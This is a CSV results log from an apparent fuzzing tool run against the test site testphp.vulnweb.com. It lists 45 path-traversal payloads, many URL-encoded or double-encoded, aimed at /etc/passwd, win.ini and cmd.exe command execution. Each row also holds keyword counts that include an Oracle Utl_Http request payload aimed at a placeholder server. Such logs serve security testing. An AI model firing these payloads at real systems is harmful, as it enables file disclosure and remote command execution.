id_fuzz,#,Payload,URL,Method,StatusCode,SearchKeyword,TimeDelay,ContentLength
id_fuzz_1,1,,http://testphp.vulnweb.com/listproducts.php?cat=..%252f..%252f..%252fetc/passwd,GET,200,"{'error': 1, 'exception': 0, 'illegal': 0, 'invalid': 0, 'fail': 0, 'stack': 0, 'access': 0, 'directory': 0, 'file': 1, 'not found': 0, 'unknown': 0, 'uid=': 0, 'c:\\': 0, 'varchar': 0, 'ODBC': 0, 'SQL': 1, 'quotation mark': 0, 'syntax': 1, 'ORA-': 0, '111111': 0, 'test': 1, 'test2': 0, ""'||Utl_Http.request('http://<yourservername>') from dual--"": 0}",0,0
id_fuzz_1,2,,http://testphp.vulnweb.com/listproducts.php?cat=....//....//....//etc/passwd,GET,200,"{'error': 1, 'exception': 0, 'illegal': 0, 'invalid': 0, 'fail': 0, 'stack': 0, 'access': 0, 'directory': 0, 'file': 1, 'not found': 0, 'unknown': 0, 'uid=': 0, 'c:\\': 0, 'varchar': 0, 'ODBC': 0, 'SQL': 1, 'quotation mark': 0, 'syntax': 1, 'ORA-': 0, '111111': 0, 'test': 1, 'test2': 0, ""'||Utl_Http.request('http://<yourservername>') from dual--"": 0}",1,0
id_fuzz_1,3,,http://testphp.vulnweb.com/listproducts.php?cat=\..\WINDOWS\win.ini,GET,200,"{'error': 1, 'exception': 0, 'illegal': 0, 'invalid': 0, 'fail': 0, 'stack': 0, 'access': 0, 'directory': 0, 'file': 1, 'not found': 0, 'unknown': 0, 'uid=': 0, 'c:\\': 0, 'varchar': 0, 'ODBC': 0, 'SQL': 1, 'quotation mark': 0, 'syntax': 1, 'ORA-': 0, '111111': 0, 'test': 1, 'test2': 0, ""'||Utl_Http.request('http://<yourservername>') from dual--"": 0}",1,0
id_fuzz_1,4,,http://testphp.vulnweb.com/listproducts.php?cat=\..\..\WINDOWS\win.ini,GET,200,"{'error': 1, 'exception': 0, 'illegal': 0, 'invalid': 0, 'fail': 0, 'stack': 0, 'access': 0, 'directory': 0, 'file': 1, 'not found': 0, 'unknown': 0, 'uid=': 0, 'c:\\': 0, 'varchar': 0, 'ODBC': 0, 'SQL': 1, 'quotation mark': 0, 'syntax': 1, 'ORA-': 0, '111111': 0, 'test': 1, 'test2': 0, ""'||Utl_Http.request('http://<yourservername>') from dual--"": 0}",1,0
id_fuzz_1,5,,http://testphp.vulnweb.com/listproducts.php?cat=\..\..\..\WINDOWS\win.ini,GET,200,"{'error': 1, 'exception': 0, 'illegal': 0, 'invalid': 0, 'fail': 0, 'stack': 0, 'access': 0, 'directory': 0, 'file': 1, 'not found': 0, 'unknown': 0, 'uid=': 0, 'c:\\': 0, 'varchar': 0, 'ODBC': 0, 'SQL': 1, 'quotation mark': 0, 'syntax': 1, 'ORA-': 0, '111111': 0, 'test': 1, 'test2': 0, ""'||Utl_Http.request('http://<yourservername>') from dual--"": 0}",1,0
id_fuzz_1,6,,http://testphp.vulnweb.com/listproducts.php?cat=\..\..\..\..\WINDOWS\win.ini,GET,200,"{'error': 1, 'exception': 0, 'illegal': 0, 'invalid': 0, 'fail': 0, 'stack': 0, 'access': 0, 'directory': 0, 'file': 1, 'not found': 0, 'unknown': 0, 'uid=': 0, 'c:\\': 0, 'varchar': 0, 'ODBC': 0, 'SQL': 1, 'quotation mark': 0, 'syntax': 1, 'ORA-': 0, '111111': 0, 'test': 1, 'test2': 0, ""'||Utl_Http.request('http://<yourservername>') from dual--"": 0}",1,0
id_fuzz_1,7,,http://testphp.vulnweb.com/listproducts.php?cat=\..\..\..\..\..\WINDOWS\win.ini,GET,200,"{'error': 1, 'exception': 0, 'illegal': 0, 'invalid': 0, 'fail': 0, 'stack': 0, 'access': 0, 'directory': 0, 'file': 1, 'not found': 0, 'unknown': 0, 'uid=': 0, 'c:\\': 0, 'varchar': 0, 'ODBC': 0, 'SQL': 1, 'quotation mark': 0, 'syntax': 1, 'ORA-': 0, '111111': 0, 'test': 1, 'test2': 0, ""'||Utl_Http.request('http://<yourservername>') from dual--"": 0}",1,0
id_fuzz_1,8,,http://testphp.vulnweb.com/listproducts.php?cat=\..\..\..\..\..\..\WINDOWS\win.ini,GET,200,"{'error': 1, 'exception': 0, 'illegal': 0, 'invalid': 0, 'fail': 0, 'stack': 0, 'access': 0, 'directory': 0, 'file': 1, 'not found': 0, 'unknown': 0, 'uid=': 0, 'c:\\': 0, 'varchar': 0, 'ODBC': 0, 'SQL': 1, 'quotation mark': 0, 'syntax': 1, 'ORA-': 0, '111111': 0, 'test': 1, 'test2': 0, ""'||Utl_Http.request('http://<yourservername>') from dual--"": 0}",1,0
id_fuzz_1,9,,http://testphp.vulnweb.com/listproducts.php?cat=%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c%57%49%4e%44%4f%57%53%5c%77%69%6e%2e%69%6e%69,GET,200,"{'error': 1, 'exception': 0, 'illegal': 0, 'invalid': 0, 'fail': 0, 'stack': 0, 'access': 0, 'directory': 0, 'file': 1, 'not found': 0, 'unknown': 0, 'uid=': 0, 'c:\\': 0, 'varchar': 0, 'ODBC': 0, 'SQL': 1, 'quotation mark': 0, 'syntax': 1, 'ORA-': 0, '111111': 0, 'test': 1, 'test2': 0, ""'||Utl_Http.request('http://<yourservername>') from dual--"": 0}",1,0
id_fuzz_1,10,,http://testphp.vulnweb.com/listproducts.php?cat=%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c%57%49%4e%44%4f%57%53%5c%77%69%6e%2e%69%6e%69,GET,200,"{'error': 1, 'exception': 0, 'illegal': 0, 'invalid': 0, 'fail': 0, 'stack': 0, 'access': 0, 'directory': 0, 'file': 1, 'not found': 0, 'unknown': 0, 'uid=': 0, 'c:\\': 0, 'varchar': 0, 'ODBC': 0, 'SQL': 1, 'quotation mark': 0, 'syntax': 1, 'ORA-': 0, '111111': 0, 'test': 1, 'test2': 0, ""'||Utl_Http.request('http://<yourservername>') from dual--"": 0}",1,0
id_fuzz_1,11,,http://testphp.vulnweb.com/listproducts.php?cat=%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c%57%49%4e%44%4f%57%53%5c%77%69%6e%2e%69%6e%69,GET,200,"{'error': 1, 'exception': 0, 'illegal': 0, 'invalid': 0, 'fail': 0, 'stack': 0, 'access': 0, 'directory': 0, 'file': 1, 'not found': 0, 'unknown': 0, 'uid=': 0, 'c:\\': 0, 'varchar': 0, 'ODBC': 0, 'SQL': 1, 'quotation mark': 0, 'syntax': 1, 'ORA-': 0, '111111': 0, 'test': 1, 'test2': 0, ""'||Utl_Http.request('http://<yourservername>') from dual--"": 0}",1,0
id_fuzz_1,12,,http://testphp.vulnweb.com/listproducts.php?cat=%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c%57%49%4e%44%4f%57%53%5c%77%69%6e%2e%69%6e%69,GET,200,"{'error': 1, 'exception': 0, 'illegal': 0, 'invalid': 0, 'fail': 0, 'stack': 0, 'access': 0, 'directory': 0, 'file': 1, 'not found': 0, 'unknown': 0, 'uid=': 0, 'c:\\': 0, 'varchar': 0, 'ODBC': 0, 'SQL': 1, 'quotation mark': 0, 'syntax': 1, 'ORA-': 0, '111111': 0, 'test': 1, 'test2': 0, ""'||Utl_Http.request('http://<yourservername>') from dual--"": 0}",1,0
id_fuzz_1,13,,http://testphp.vulnweb.com/listproducts.php?cat=%5c%2e%2e%5c%2e%2e%5c%57%49%4e%44%4f%57%53%5c%77%69%6e%2e%69%6e%69,GET,200,"{'error': 1, 'exception': 0, 'illegal': 0, 'invalid': 0, 'fail': 0, 'stack': 0, 'access': 0, 'directory': 0, 'file': 1, 'not found': 0, 'unknown': 0, 'uid=': 0, 'c:\\': 0, 'varchar': 0, 'ODBC': 0, 'SQL': 1, 'quotation mark': 0, 'syntax': 1, 'ORA-': 0, '111111': 0, 'test': 1, 'test2': 0, ""'||Utl_Http.request('http://<yourservername>') from dual--"": 0}",1,0
id_fuzz_1,14,,http://testphp.vulnweb.com/listproducts.php?cat=%5c%2e%2e%5c%57%49%4e%44%4f%57%53%5c%77%69%6e%2e%69%6e%69,GET,200,"{'error': 1, 'exception': 0, 'illegal': 0, 'invalid': 0, 'fail': 0, 'stack': 0, 'access': 0, 'directory': 0, 'file': 1, 'not found': 0, 'unknown': 0, 'uid=': 0, 'c:\\': 0, 'varchar': 0, 'ODBC': 0, 'SQL': 1, 'quotation mark': 0, 'syntax': 1, 'ORA-': 0, '111111': 0, 'test': 1, 'test2': 0, ""'||Utl_Http.request('http://<yourservername>') from dual--"": 0}",1,0
id_fuzz_1,15,,http://testphp.vulnweb.com/listproducts.php?cat=%5c%57%49%4e%44%4f%57%53%5c%77%69%6e%2e%69%6e%69,GET,200,"{'error': 1, 'exception': 0, 'illegal': 0, 'invalid': 0, 'fail': 0, 'stack': 0, 'access': 0, 'directory': 0, 'file': 1, 'not found': 0, 'unknown': 0, 'uid=': 0, 'c:\\': 0, 'varchar': 0, 'ODBC': 0, 'SQL': 1, 'quotation mark': 0, 'syntax': 1, 'ORA-': 0, '111111': 0, 'test': 1, 'test2': 0, ""'||Utl_Http.request('http://<yourservername>') from dual--"": 0}",1,0
id_fuzz_1,16,,http://testphp.vulnweb.com/listproducts.php?cat=%%35%63%%32%65%%32%65%%35%63%%32%65%%32%65%%35%63%%32%65%%32%65%%35%63%%32%65%%32%65%%35%63%%32%65%%32%65%%35%63%%32%65%%32%65%%35%63%%35%37%%34%39%%34%65%%34%34%%34%66%%35%37%%35%33%%35%63%%37%37%%36%39%%36%65%%32%65%%36%39%%36%65%%36%39,GET,200,"{'error': 1, 'exception': 0, 'illegal': 0, 'invalid': 0, 'fail': 0, 'stack': 0, 'access': 0, 'directory': 0, 'file': 1, 'not found': 0, 'unknown': 0, 'uid=': 0, 'c:\\': 0, 'varchar': 0, 'ODBC': 0, 'SQL': 1, 'quotation mark': 0, 'syntax': 1, 'ORA-': 0, '111111': 0, 'test': 1, 'test2': 0, ""'||Utl_Http.request('http://<yourservername>') from dual--"": 0}",1,0
id_fuzz_1,17,,http://testphp.vulnweb.com/listproducts.php?cat=%%35%63%%32%65%%32%65%%35%63%%32%65%%32%65%%35%63%%32%65%%32%65%%35%63%%32%65%%32%65%%35%63%%32%65%%32%65%%35%63%%35%37%%34%39%%34%65%%34%34%%34%66%%35%37%%35%33%%35%63%%37%37%%36%39%%36%65%%32%65%%36%39%%36%65%%36%39,GET,200,"{'error': 1, 'exception': 0, 'illegal': 0, 'invalid': 0, 'fail': 0, 'stack': 0, 'access': 0, 'directory': 0, 'file': 1, 'not found': 0, 'unknown': 0, 'uid=': 0, 'c:\\': 0, 'varchar': 0, 'ODBC': 0, 'SQL': 1, 'quotation mark': 0, 'syntax': 1, 'ORA-': 0, '111111': 0, 'test': 1, 'test2': 0, ""'||Utl_Http.request('http://<yourservername>') from dual--"": 0}",1,0
id_fuzz_1,18,,http://testphp.vulnweb.com/listproducts.php?cat=%%35%63%%32%65%%32%65%%35%63%%32%65%%32%65%%35%63%%32%65%%32%65%%35%63%%32%65%%32%65%%35%63%%35%37%%34%39%%34%65%%34%34%%34%66%%35%37%%35%33%%35%63%%37%37%%36%39%%36%65%%32%65%%36%39%%36%65%%36%39,GET,200,"{'error': 1, 'exception': 0, 'illegal': 0, 'invalid': 0, 'fail': 0, 'stack': 0, 'access': 0, 'directory': 0, 'file': 1, 'not found': 0, 'unknown': 0, 'uid=': 0, 'c:\\': 0, 'varchar': 0, 'ODBC': 0, 'SQL': 1, 'quotation mark': 0, 'syntax': 1, 'ORA-': 0, '111111': 0, 'test': 1, 'test2': 0, ""'||Utl_Http.request('http://<yourservername>') from dual--"": 0}",1,0
id_fuzz_1,19,,http://testphp.vulnweb.com/listproducts.php?cat=%%35%63%%32%65%%32%65%%35%63%%32%65%%32%65%%35%63%%32%65%%32%65%%35%63%%35%37%%34%39%%34%65%%34%34%%34%66%%35%37%%35%33%%35%63%%37%37%%36%39%%36%65%%32%65%%36%39%%36%65%%36%39,GET,200,"{'error': 1, 'exception': 0, 'illegal': 0, 'invalid': 0, 'fail': 0, 'stack': 0, 'access': 0, 'directory': 0, 'file': 1, 'not found': 0, 'unknown': 0, 'uid=': 0, 'c:\\': 0, 'varchar': 0, 'ODBC': 0, 'SQL': 1, 'quotation mark': 0, 'syntax': 1, 'ORA-': 0, '111111': 0, 'test': 1, 'test2': 0, ""'||Utl_Http.request('http://<yourservername>') from dual--"": 0}",1,0
id_fuzz_1,20,,http://testphp.vulnweb.com/listproducts.php?cat=..%5c..%5c../winnt/system32/cmd.exe?/c+dir+c:\,GET,200,"{'error': 1, 'exception': 0, 'illegal': 0, 'invalid': 0, 'fail': 0, 'stack': 0, 'access': 0, 'directory': 0, 'file': 1, 'not found': 0, 'unknown': 0, 'uid=': 0, 'c:\\': 1, 'varchar': 0, 'ODBC': 0, 'SQL': 1, 'quotation mark': 0, 'syntax': 1, 'ORA-': 0, '111111': 0, 'test': 1, 'test2': 0, ""'||Utl_Http.request('http://<yourservername>') from dual--"": 0}",1,0
id_fuzz_1,21,,http://testphp.vulnweb.com/listproducts.php?cat=..%5c..%5c..%5c../winnt/system32/cmd.exe?/c+dir+c:\,GET,200,"{'error': 1, 'exception': 0, 'illegal': 0, 'invalid': 0, 'fail': 0, 'stack': 0, 'access': 0, 'directory': 0, 'file': 1, 'not found': 0, 'unknown': 0, 'uid=': 0, 'c:\\': 1, 'varchar': 0, 'ODBC': 0, 'SQL': 1, 'quotation mark': 0, 'syntax': 1, 'ORA-': 0, '111111': 0, 'test': 1, 'test2': 0, ""'||Utl_Http.request('http://<yourservername>') from dual--"": 0}",1,0
id_fuzz_1,22,,http://testphp.vulnweb.com/listproducts.php?cat=..%5c..%5c..%5c..%5c../winnt/system32/cmd.exe?/c+dir+c:\,GET,200,"{'error': 1, 'exception': 0, 'illegal': 0, 'invalid': 0, 'fail': 0, 'stack': 0, 'access': 0, 'directory': 0, 'file': 1, 'not found': 0, 'unknown': 0, 'uid=': 0, 'c:\\': 1, 'varchar': 0, 'ODBC': 0, 'SQL': 1, 'quotation mark': 0, 'syntax': 1, 'ORA-': 0, '111111': 0, 'test': 1, 'test2': 0, ""'||Utl_Http.request('http://<yourservername>') from dual--"": 0}",1,0
id_fuzz_1,23,,http://testphp.vulnweb.com/listproducts.php?cat=..%5c..%5c..%5c..%5c..%5c../winnt/system32/cmd.exe?/c+dir+c:\,GET,200,"{'error': 1, 'exception': 0, 'illegal': 0, 'invalid': 0, 'fail': 0, 'stack': 0, 'access': 0, 'directory': 0, 'file': 1, 'not found': 0, 'unknown': 0, 'uid=': 0, 'c:\\': 1, 'varchar': 0, 'ODBC': 0, 'SQL': 1, 'quotation mark': 0, 'syntax': 1, 'ORA-': 0, '111111': 0, 'test': 1, 'test2': 0, ""'||Utl_Http.request('http://<yourservername>') from dual--"": 0}",1,0
id_fuzz_1,24,,http://testphp.vulnweb.com/listproducts.php?cat=..%5c..%5c..%5c..%5c..%5c..%5c../winnt/system32/cmd.exe?/c+dir+c:\,GET,200,"{'error': 1, 'exception': 0, 'illegal': 0, 'invalid': 0, 'fail': 0, 'stack': 0, 'access': 0, 'directory': 0, 'file': 1, 'not found': 0, 'unknown': 0, 'uid=': 0, 'c:\\': 1, 'varchar': 0, 'ODBC': 0, 'SQL': 1, 'quotation mark': 0, 'syntax': 1, 'ORA-': 0, '111111': 0, 'test': 1, 'test2': 0, ""'||Utl_Http.request('http://<yourservername>') from dual--"": 0}",1,0
id_fuzz_1,25,,http://testphp.vulnweb.com/listproducts.php?cat=..%5c..%5c..%5c..%5c..%5c..%5c..%5c../winnt/system32/cmd.exe?/c+dir+c:\,GET,200,"{'error': 1, 'exception': 0, 'illegal': 0, 'invalid': 0, 'fail': 0, 'stack': 0, 'access': 0, 'directory': 0, 'file': 1, 'not found': 0, 'unknown': 0, 'uid=': 0, 'c:\\': 1, 'varchar': 0, 'ODBC': 0, 'SQL': 1, 'quotation mark': 0, 'syntax': 1, 'ORA-': 0, '111111': 0, 'test': 1, 'test2': 0, ""'||Utl_Http.request('http://<yourservername>') from dual--"": 0}",1,0
id_fuzz_1,26,,http://testphp.vulnweb.com/listproducts.php?cat=..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c../winnt/system32/cmd.exe?/c+dir+c:\,GET,200,"{'error': 1, 'exception': 0, 'illegal': 0, 'invalid': 0, 'fail': 0, 'stack': 0, 'access': 0, 'directory': 0, 'file': 1, 'not found': 0, 'unknown': 0, 'uid=': 0, 'c:\\': 1, 'varchar': 0, 'ODBC': 0, 'SQL': 1, 'quotation mark': 0, 'syntax': 1, 'ORA-': 0, '111111': 0, 'test': 1, 'test2': 0, ""'||Utl_Http.request('http://<yourservername>') from dual--"": 0}",1,0
id_fuzz_1,27,,http://testphp.vulnweb.com/listproducts.php?cat=%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%77%69%6e%6e%74%2f%73%79%73%74%65%6d%33%32%2f%63%6d%64%2e%65%78%65%3f%2f%63%2b%64%69%72%2b%63%3a%5c,GET,200,"{'error': 1, 'exception': 0, 'illegal': 0, 'invalid': 0, 'fail': 0, 'stack': 0, 'access': 0, 'directory': 0, 'file': 1, 'not found': 0, 'unknown': 0, 'uid=': 0, 'c:\\': 1, 'varchar': 0, 'ODBC': 0, 'SQL': 1, 'quotation mark': 0, 'syntax': 1, 'ORA-': 0, '111111': 0, 'test': 1, 'test2': 0, ""'||Utl_Http.request('http://<yourservername>') from dual--"": 0}",1,0
id_fuzz_1,28,,http://testphp.vulnweb.com/listproducts.php?cat=%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%77%69%6e%6e%74%2f%73%79%73%74%65%6d%33%32%2f%63%6d%64%2e%65%78%65%3f%2f%63%2b%64%69%72%2b%63%3a%5c,GET,200,"{'error': 1, 'exception': 0, 'illegal': 0, 'invalid': 0, 'fail': 0, 'stack': 0, 'access': 0, 'directory': 0, 'file': 1, 'not found': 0, 'unknown': 0, 'uid=': 0, 'c:\\': 1, 'varchar': 0, 'ODBC': 0, 'SQL': 1, 'quotation mark': 0, 'syntax': 1, 'ORA-': 0, '111111': 0, 'test': 1, 'test2': 0, ""'||Utl_Http.request('http://<yourservername>') from dual--"": 0}",1,0
id_fuzz_1,29,,http://testphp.vulnweb.com/listproducts.php?cat=%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%77%69%6e%6e%74%2f%73%79%73%74%65%6d%33%32%2f%63%6d%64%2e%65%78%65%3f%2f%63%2b%64%69%72%2b%63%3a%5c,GET,200,"{'error': 1, 'exception': 0, 'illegal': 0, 'invalid': 0, 'fail': 0, 'stack': 0, 'access': 0, 'directory': 0, 'file': 1, 'not found': 0, 'unknown': 0, 'uid=': 0, 'c:\\': 1, 'varchar': 0, 'ODBC': 0, 'SQL': 1, 'quotation mark': 0, 'syntax': 1, 'ORA-': 0, '111111': 0, 'test': 1, 'test2': 0, ""'||Utl_Http.request('http://<yourservername>') from dual--"": 0}",1,0
id_fuzz_1,30,,http://testphp.vulnweb.com/listproducts.php?cat=%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%77%69%6e%6e%74%2f%73%79%73%74%65%6d%33%32%2f%63%6d%64%2e%65%78%65%3f%2f%63%2b%64%69%72%2b%63%3a%5c,GET,200,"{'error': 1, 'exception': 0, 'illegal': 0, 'invalid': 0, 'fail': 0, 'stack': 0, 'access': 0, 'directory': 0, 'file': 1, 'not found': 0, 'unknown': 0, 'uid=': 0, 'c:\\': 1, 'varchar': 0, 'ODBC': 0, 'SQL': 1, 'quotation mark': 0, 'syntax': 1, 'ORA-': 0, '111111': 0, 'test': 1, 'test2': 0, ""'||Utl_Http.request('http://<yourservername>') from dual--"": 0}",1,0
id_fuzz_1,31,,http://testphp.vulnweb.com/listproducts.php?cat=%2e%2e%2f%2e%2e%2f%2e%2e%2f%77%69%6e%6e%74%2f%73%79%73%74%65%6d%33%32%2f%63%6d%64%2e%65%78%65%3f%2f%63%2b%64%69%72%2b%63%3a%5c,GET,200,"{'error': 1, 'exception': 0, 'illegal': 0, 'invalid': 0, 'fail': 0, 'stack': 0, 'access': 0, 'directory': 0, 'file': 1, 'not found': 0, 'unknown': 0, 'uid=': 0, 'c:\\': 1, 'varchar': 0, 'ODBC': 0, 'SQL': 1, 'quotation mark': 0, 'syntax': 1, 'ORA-': 0, '111111': 0, 'test': 1, 'test2': 0, ""'||Utl_Http.request('http://<yourservername>') from dual--"": 0}",1,0
id_fuzz_1,32,,http://testphp.vulnweb.com/listproducts.php?cat=%2e%2e%2f%2e%2e%2f%77%69%6e%6e%74%2f%73%79%73%74%65%6d%33%32%2f%63%6d%64%2e%65%78%65%3f%2f%63%2b%64%69%72%2b%63%3a%5c,GET,200,"{'error': 1, 'exception': 0, 'illegal': 0, 'invalid': 0, 'fail': 0, 'stack': 0, 'access': 0, 'directory': 0, 'file': 1, 'not found': 0, 'unknown': 0, 'uid=': 0, 'c:\\': 1, 'varchar': 0, 'ODBC': 0, 'SQL': 1, 'quotation mark': 0, 'syntax': 1, 'ORA-': 0, '111111': 0, 'test': 1, 'test2': 0, ""'||Utl_Http.request('http://<yourservername>') from dual--"": 0}",1,0
id_fuzz_1,33,,http://testphp.vulnweb.com/listproducts.php?cat=%2e%2e%2f%77%69%6e%6e%74%2f%73%79%73%74%65%6d%33%32%2f%63%6d%64%2e%65%78%65%3f%2f%63%2b%64%69%72%2b%63%3a%5c,GET,200,"{'error': 1, 'exception': 0, 'illegal': 0, 'invalid': 0, 'fail': 0, 'stack': 0, 'access': 0, 'directory': 0, 'file': 1, 'not found': 0, 'unknown': 0, 'uid=': 0, 'c:\\': 1, 'varchar': 0, 'ODBC': 0, 'SQL': 1, 'quotation mark': 0, 'syntax': 1, 'ORA-': 0, '111111': 0, 'test': 1, 'test2': 0, ""'||Utl_Http.request('http://<yourservername>') from dual--"": 0}",1,0
id_fuzz_1,34,,http://testphp.vulnweb.com/listproducts.php?cat=../../../../../../../../../etc/passwd,GET,200,"{'error': 1, 'exception': 0, 'illegal': 0, 'invalid': 0, 'fail': 0, 'stack': 0, 'access': 0, 'directory': 0, 'file': 1, 'not found': 0, 'unknown': 0, 'uid=': 0, 'c:\\': 0, 'varchar': 0, 'ODBC': 0, 'SQL': 1, 'quotation mark': 0, 'syntax': 1, 'ORA-': 0, '111111': 0, 'test': 1, 'test2': 0, ""'||Utl_Http.request('http://<yourservername>') from dual--"": 0}",1,0
id_fuzz_1,35,,http://testphp.vulnweb.com/listproducts.php?cat=../../../../../../../../etc/passwd,GET,200,"{'error': 1, 'exception': 0, 'illegal': 0, 'invalid': 0, 'fail': 0, 'stack': 0, 'access': 0, 'directory': 0, 'file': 1, 'not found': 0, 'unknown': 0, 'uid=': 0, 'c:\\': 0, 'varchar': 0, 'ODBC': 0, 'SQL': 1, 'quotation mark': 0, 'syntax': 1, 'ORA-': 0, '111111': 0, 'test': 1, 'test2': 0, ""'||Utl_Http.request('http://<yourservername>') from dual--"": 0}",1,0
id_fuzz_1,36,,http://testphp.vulnweb.com/listproducts.php?cat=../../../../../../../etc/passwd,GET,200,"{'error': 1, 'exception': 0, 'illegal': 0, 'invalid': 0, 'fail': 0, 'stack': 0, 'access': 0, 'directory': 0, 'file': 1, 'not found': 0, 'unknown': 0, 'uid=': 0, 'c:\\': 0, 'varchar': 0, 'ODBC': 0, 'SQL': 1, 'quotation mark': 0, 'syntax': 1, 'ORA-': 0, '111111': 0, 'test': 1, 'test2': 0, ""'||Utl_Http.request('http://<yourservername>') from dual--"": 0}",1,0
id_fuzz_1,37,,http://testphp.vulnweb.com/listproducts.php?cat=../../../../../../etc/passwd,GET,200,"{'error': 1, 'exception': 0, 'illegal': 0, 'invalid': 0, 'fail': 0, 'stack': 0, 'access': 0, 'directory': 0, 'file': 1, 'not found': 0, 'unknown': 0, 'uid=': 0, 'c:\\': 0, 'varchar': 0, 'ODBC': 0, 'SQL': 1, 'quotation mark': 0, 'syntax': 1, 'ORA-': 0, '111111': 0, 'test': 1, 'test2': 0, ""'||Utl_Http.request('http://<yourservername>') from dual--"": 0}",1,0
id_fuzz_1,38,,http://testphp.vulnweb.com/listproducts.php?cat=../../../../../etc/passwd,GET,200,"{'error': 1, 'exception': 0, 'illegal': 0, 'invalid': 0, 'fail': 0, 'stack': 0, 'access': 0, 'directory': 0, 'file': 1, 'not found': 0, 'unknown': 0, 'uid=': 0, 'c:\\': 0, 'varchar': 0, 'ODBC': 0, 'SQL': 1, 'quotation mark': 0, 'syntax': 1, 'ORA-': 0, '111111': 0, 'test': 1, 'test2': 0, ""'||Utl_Http.request('http://<yourservername>') from dual--"": 0}",1,0
id_fuzz_1,39,,http://testphp.vulnweb.com/listproducts.php?cat=../../../../etc/passwd,GET,200,"{'error': 1, 'exception': 0, 'illegal': 0, 'invalid': 0, 'fail': 0, 'stack': 0, 'access': 0, 'directory': 0, 'file': 1, 'not found': 0, 'unknown': 0, 'uid=': 0, 'c:\\': 0, 'varchar': 0, 'ODBC': 0, 'SQL': 1, 'quotation mark': 0, 'syntax': 1, 'ORA-': 0, '111111': 0, 'test': 1, 'test2': 0, ""'||Utl_Http.request('http://<yourservername>') from dual--"": 0}",1,0
id_fuzz_1,40,,http://testphp.vulnweb.com/listproducts.php?cat=../../../etc/passwd,GET,200,"{'error': 1, 'exception': 0, 'illegal': 0, 'invalid': 0, 'fail': 0, 'stack': 0, 'access': 0, 'directory': 0, 'file': 1, 'not found': 0, 'unknown': 0, 'uid=': 0, 'c:\\': 0, 'varchar': 0, 'ODBC': 0, 'SQL': 1, 'quotation mark': 0, 'syntax': 1, 'ORA-': 0, '111111': 0, 'test': 1, 'test2': 0, ""'||Utl_Http.request('http://<yourservername>') from dual--"": 0}",1,0
id_fuzz_1,41,,http://testphp.vulnweb.com/listproducts.php?cat=%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%65%74%63%2f%70%61%73%73%77%64,GET,200,"{'error': 1, 'exception': 0, 'illegal': 0, 'invalid': 0, 'fail': 0, 'stack': 0, 'access': 0, 'directory': 0, 'file': 1, 'not found': 0, 'unknown': 0, 'uid=': 0, 'c:\\': 0, 'varchar': 0, 'ODBC': 0, 'SQL': 1, 'quotation mark': 0, 'syntax': 1, 'ORA-': 0, '111111': 0, 'test': 1, 'test2': 0, ""'||Utl_Http.request('http://<yourservername>') from dual--"": 0}",1,0
id_fuzz_1,42,,http://testphp.vulnweb.com/listproducts.php?cat=%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%65%74%63%2f%70%61%73%73%77%64,GET,200,"{'error': 1, 'exception': 0, 'illegal': 0, 'invalid': 0, 'fail': 0, 'stack': 0, 'access': 0, 'directory': 0, 'file': 1, 'not found': 0, 'unknown': 0, 'uid=': 0, 'c:\\': 0, 'varchar': 0, 'ODBC': 0, 'SQL': 1, 'quotation mark': 0, 'syntax': 1, 'ORA-': 0, '111111': 0, 'test': 1, 'test2': 0, ""'||Utl_Http.request('http://<yourservername>') from dual--"": 0}",1,0
id_fuzz_1,43,,http://testphp.vulnweb.com/listproducts.php?cat=%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%65%74%63%2f%70%61%73%73%77%64,GET,200,"{'error': 1, 'exception': 0, 'illegal': 0, 'invalid': 0, 'fail': 0, 'stack': 0, 'access': 0, 'directory': 0, 'file': 1, 'not found': 0, 'unknown': 0, 'uid=': 0, 'c:\\': 0, 'varchar': 0, 'ODBC': 0, 'SQL': 1, 'quotation mark': 0, 'syntax': 1, 'ORA-': 0, '111111': 0, 'test': 1, 'test2': 0, ""'||Utl_Http.request('http://<yourservername>') from dual--"": 0}",1,0
id_fuzz_1,44,,http://testphp.vulnweb.com/listproducts.php?cat=%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%65%74%63%2f%70%61%73%73%77%64,GET,200,"{'error': 1, 'exception': 0, 'illegal': 0, 'invalid': 0, 'fail': 0, 'stack': 0, 'access': 0, 'directory': 0, 'file': 1, 'not found': 0, 'unknown': 0, 'uid=': 0, 'c:\\': 0, 'varchar': 0, 'ODBC': 0, 'SQL': 1, 'quotation mark': 0, 'syntax': 1, 'ORA-': 0, '111111': 0, 'test': 1, 'test2': 0, ""'||Utl_Http.request('http://<yourservername>') from dual--"": 0}",1,0
id_fuzz_1,45,,http://testphp.vulnweb.com/listproducts.php?cat=%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%65%74%63%2f%70%61%73%73%77%64,GET,200,"{'error': 1, 'exception': 0, 'illegal': 0, 'invalid': 0, 'fail': 0, 'stack': 0, 'access': 0, 'directory': 0, 'file': 1, 'not found': 0, 'unknown': 0, 'uid=': 0, 'c:\\': 0, 'varchar': 0, 'ODBC': 0, 'SQL': 1, 'quotation mark': 0, 'syntax': 1, 'ORA-': 0, '111111': 0, 'test': 1, 'test2': 0, ""'||Utl_Http.request('http://<yourservername>') from dual--"": 0}",1,0
